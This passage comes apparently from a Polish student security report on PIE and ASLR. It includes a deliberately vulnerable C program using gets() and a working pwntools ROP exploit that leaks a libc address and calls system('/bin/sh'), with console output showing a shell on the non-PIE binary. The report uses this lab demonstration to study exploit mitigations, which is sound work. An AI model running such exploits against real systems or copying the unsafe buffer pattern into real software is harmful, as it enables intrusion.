Poniżej znajduje się porównanie kodu asemblera pomiędzy programem nie wspierającym  PIE oraz drugim, skompilowanym jako PIE. Ponieważ obydwa programy zostały skompilowane na procesor 32-bitowy, widoczna  jest różnica w miejscu gdzie program PIE chce zawołać funkcje `my_func`. Aby wyliczyć adres funkcji programu potrzebuje wartość wskaźnika instrukcji, którą na 32-bitowych systemach pozyskuje się za pomocą wywołania `get_pc_thunk`. Po tej operacji w rejestrze `eax` znajduje się już wartość rejestru `eip` (wskaźnik instrukcji). W następnej instrukcji dodawana jest ustalona wartość (offset) i w ten sposób w rejestrze `eax` znajduje się teraz adres funkcji `my_func`. 

<font size=1>

```assembly
Dump of assembler code for function main:  # bez PIE
   0x5655d1bb <+0>:	 endbr32
   0x5655d1bf <+4>:	 push   ebp
   0x5655d1c0 <+5>:	 mov    ebp,esp
   0x5655d1c2 <+7>:	 call   0x5655d1ad <my_func>
   0x5655d1c7 <+12>: mov    eax,0x0
   0x5655d1cc <+17>: pop    ebp
   0x5655d1cd <+18>: ret
```

<div style="page-break-after: always;"></div>

```assembly
Dump of assembler code for function main:  # PIE                      
   0x5656e1c5 <+0>:  endbr32                                      
   0x5656e1c9 <+4>:  push   ebp                                   
   0x5656e1ca <+5>:  mov    ebp,esp
   0x5656e1cc <+7>:  call   0x5656e1e2 <__x86.get_pc_thunk.ax>   ---.
   0x5656e1d1 <+12>: add    eax,0x2e0b                              |
   0x5656e1d6 <+17>: call   0x5656e1ad <my_func>                    |
   0x5656e1db <+22>: mov    eax,0x0                                 |
   0x5656e1e0 <+27>: pop    ebp                                     |
   0x5656e1e1 <+28>: ret                                            |
                                                                    |
Dump of assembler code for function __x86.get_pc_thunk.ax:          |
   0x0000124a <+0>:	mov    eax,DWORD PTR [esp]             <--------'
   0x0000124d <+3>:	ret    
   0x0000124e <+4>:	xchg   ax,ax
```

</font>

##### Implementacja w kompilatorach (gcc i clang) <a name="kompilatory_pie"></a>

Z racji na kompatybilność, nie ma różnic w kompilowaniu programów PIE na kompilatorach gcc i clang. Poniższe informacje odnoszą się do obydwu kompilatorów.   

W trakcie kompilacji użytkownik ma do wyboru:

- `-fpie` - kompilowanie do PIE, z przestrzeganiem ograniczenia wielkości sekcji `GOT` (zależne od maszyny, na x86 ograniczenia już nie ma)
- `-fPIE` - kompilowanie do PIE, nieograniczona sekcja `GOT`
- `-fno-pie, -fno-PIE` - wyłączenie kompilacji do PIE

##### Zastosowanie  w praktyce <a name="zastosowanie_pie"></a>

Ponieważ prezentacja PIE bez włączonego ASLR nie miałaby zbytnio sensu, to zacznę od eksploatacji programu skompilowanego bez obsługi PIE, lecz z włączonym w systemie ASLR. Dodatkowym utrudnieniem jest to, że program został skompilowany na procesory 64-bitowe, czyli argumenty do funkcji przekazywane są za pomocą rejestrów. W celu eksploitacji tego programu zastosuję, wcześniej wspomniany, atak return-to-plt (w połączeniu z return-to-libc) i będzie on polegał na wykorzystaniu sekcji PLT, jako punktu odniesienia, dzięki któremu będzie można wyliczyć adres biblioteki libc. 

<font size=1>

```c
#include <stdio.h>

void vuln() {
  puts("It never gets old");
  char buffer[64];
  gets(buffer);
}

int main() {
  vuln();
  return 0;
}
```

</font>

Poniższy eksploit działa w dwóch etapach, a jego celem wywołanie funkcji `system` z parametrem `/bin/sh`. Aby było to możliwe należy najpierw uzyskać adres biblioteki libc. Wiadomo, że w wypadku programu skompilowanego bez PIE, offset do sekcji `PLT` jest znany i niezmienny. Jeśli dodatkowo uda się ujawnić adres jakiejś funkcji (z biblioteki libc) w trakcie działania programu, to można z tych danych wyliczyć adres biblioteki libc. Dlatego zadaniem pierwszego etapu eksploitu jest wypisanie adresu funkcji `gets`, a następnie przekierowanie wykonywania programu ponownie do funkcji `main`. Teraz od uzyskanego adresu wystarczy odjąć odczytany z pliku ELF offset. Znając już adres biblioteki libc, eksploit przechodzi do drugiego etapu, w którym wykonuje atak return-to-libc poprzez nadpisanie adresu powrotu funkcji `vuln`.  Podczas pisania tego eksploitu długo nie mogłem znaleźć powodu, dla którego na ostatnim etapie, gdy wołana była funkcja `system`, program zwracał `SIGSEGV`. Okazało się, że na Ubuntu, w trakcie wołania funkcji `do_system` wykonywana jest dodatkowa instrukcja `movaps`, której zadaniem jest wczytanie danych na stos. Nie było by w tym nic specjalnego, gdyby nie to, że wymaga ona, aby stos był wyrównany do 16 bajtów.

<font size=1>

```python
import sys
from pwn import *

# debuggowanie
#p = gdb.debug('./vuln-64', ''  break vuln   c''')
#context.log_level = 'DEBUG'

##########  przygotowanie  ###########
PADDING_SIZE = 72                            # buffer+padding - tyle zeby nadpisac rbp na stosie
PATH_TO_BINARY = sys.argv[1]                 # sciezka do eksploitowanego programu
elf = context.binary = ELF(PATH_TO_BINARY)
libc = elf.libc
p = process()

##############  etap 1  ##############
p.recvline()
rop = ROP(elf)
rop.raw('A'*PADDING_SIZE)
rop.raw(rop.rdi)
rop.raw(elf.got['gets'])
rop.raw(elf.plt['puts'])
rop.raw(elf.sym['main'])
p.sendline(rop.chain())

######  wyliczenie adresu libc  ######
leaked_gets = u64(p.recv(6) + b'\x00\x00')  # otrzymany adres funkcji gets
libc.address = leaked_gets - libc.sym['gets']

##############  etap 2  ##############
rop = ROP(elf)
rop.raw('A'*PADDING_SIZE)
rop.raw(rop.rdi)
rop.raw(next(libc.search(b'/bin/sh\x00')))
rop.raw(rop.ret)                            # wyrównanie stosu
rop.raw(libc.sym['system'])
rop.raw(libc.sym['exit'])
p.sendline(rop.chain())
p.recvlines(2)

p.interactive('> ')
```

</font>

Jak widać na poniższym zrzucie konsoli, eksploit spełnia swoje zadanie na programie skompilowanym bez PIE.

<font size=1>

```bash
mb@ubuntu:~/Desktop/projekt_bso/PIE$ python3 exploit.py outNoPIE 
[*] '/home/mb/Desktop/projekt_bso/PIE/outNoPIE'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
[*] '/usr/lib/x86_64-linux-gnu/libc-2.32.so'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
[+] Starting local process '/home/mb/Desktop/projekt_bso/PIE/outNoPIE': pid 3412
[*] Loaded 14 cached gadgets for 'outNoPIE'
[*] Switching to interactive mode
> ls
exploit.py  outNoPIE  outPIE  skrypt.sh  vuln.c
>
```

</font>

Przy powtórzeniu próby wykonania eksploitu, tym razem na aplikacji skompilowanej jako PIE, nie udaje się uzyskać konsoli. Powodem jest oczywiście fakt, że teraz sekcja `PLT` nie ma znanego offsetu - jest on wybierany w momencie uruchomienia programu. 

<font size=1>

```shell
mb@ubuntu:~/Desktop/projekt_bso/PIE$ python3 exploit.py outPIE 
[*] '/home/mb/Desktop/projekt_bso/PIE/outPIE'
    Arch:     amd64-64-little
    RELRO:    No RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      PIE enabled
[*] '/usr/lib/x86_64-linux-gnu/libc-2.32.so'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
[+] Starting local process '/home/mb/Desktop/projekt_bso/PIE/outPIE': pid 2764
[*] Loaded 14 cached gadgets for 'outPIE'
Traceback (most recent call last):
  File "exploit.py", line 26, in <module>
    leaked_gets = u64(p.recv(6) + b'\x00\x00')
  File "/home/mb/.local/lib/python3.8/site-packages/pwnlib/tubes/tube.py", line 105, in recv
    return self._recv(numb, timeout) or b''
  File "/home/mb/.local/lib/python3.8/site-packages/pwnlib/tubes/tube.py", line 183, in _recv
    if not self.buffer and not self._fillbuffer(timeout):
  File "/home/mb/.local/lib/python3.8/site-packages/pwnlib/tubes/tube.py", line 154, in _fillbuffer
    data = self.recv_raw(self.buffer.get_fill_size())
  File "/home/mb/.local/lib/python3.8/site-packages/pwnlib/tubes/process.py", line 716, in recv_raw
    raise EOFError
EOFError
```

</font>

------

Jako dodatkowe potwierdzenie działania PIE, przygotowałem krótki skrypt, za którego pomocą mogę, w czytelny sposób, poznać adres sekcji `PLT` programu.

<font size=1>

```bash
#!/bin/sh
exec gdb --nx outPIE -ex "break main" -ex "set disable-randomization off" -ex "run" -ex "maintenance info sections" -ex "q"

# użycie: yes | ./srypt.sh | grep -w "12"
```

</font>

Poniżej wynik działania skryptu dla pięciu wykonań programu bez PIE - jak widać adres jest stały.

<font size=1>

```vhdl
 [12]  0x00401020->0x00401050 at 0x00001020: .plt ALLOC LOAD READONLY CODE
 [12]  0x00401020->0x00401050 at 0x00001020: .plt ALLOC LOAD READONLY CODE
 [12]  0x00401020->0x00401050 at 0x00001020: .plt ALLOC LOAD READONLY CODE
 [12]  0x00401020->0x00401050 at 0x00001020: .plt ALLOC LOAD READONLY CODE
 [12]  0x00401020->0x00401050 at 0x00001020: .plt ALLOC LOAD READONLY CODE
```

</font>

Teraz to samo, ale z programem skompilowanym jako PIE.

<font size=1>

```vhdl
 [12]  0x56365f8ca020->0x56365f8ca050 at 0x00001020: .plt ALLOC LOAD READONLY CODE
 [12]  0x564a6cd19020->0x564a6cd19050 at 0x00001020: .plt ALLOC LOAD READONLY CODE 
 [12]  0x5570748b9020->0x5570748b9050 at 0x00001020: .plt ALLOC LOAD READONLY CODE
 [12]  0x55bcd8c71020->0x55bcd8c71050 at 0x00001020: .plt ALLOC LOAD READONLY CODE
 [12]  0x55a4e466e020->0x55a4e466e050 at 0x00001020: .plt ALLOC LOAD READONLY CODE
```

</font>

##### Wady i zalety <a name="wady_zalety_pie"></a>

Programy skompilowane jako Position-Independent Executable są trudniejsze do eksploitacji niektórymi metodami. Jest to jednak obarczone pewnym kosztem - wydajnością. Ten temat poruszył  Mathias Payer w publikacji "Too much PIE is bad for performance". O ile na architekturach 64-bitowych mowa jest o spowolnieniu działania programu silnie polegającego na CPU jedynie o około 3%, to na 32-bitach nie wygląda to już tak dobrze. Tam dla programów silnie polegających na CPU, wydajność spada  średnio o 10%, a w szczególnych przypadkach może dochodzić do 25%. Takie wartości skłaniają do refleksji, czy aby na pewno warto każdy program na 32-bitowej architekturze kompilować jako PIE.

### Wnioski <a name="wnioski"></a>

Jak pokazały wcześniejsze przykłady nie ma uniwersalnego zabezpieczenia przed atakami polegającymi na przepełnieniu bufora. Każde rozwiązanie zabezpiecza tylko jakąś część programu lub jedynie utrudnia atak. Najlepsze rezultaty dla bezpieczeństwa uzyskuje się przy połączeniu dużej ilości zabezpieczeń, tak aby mogły się uzupełniać. Należy jednak znać ich słabe strony i mieć świadomość, że nie są one rozwiązaniem na poprawianie błędów programisty - na przykład takich jak używanie niebezpiecznych funkcji.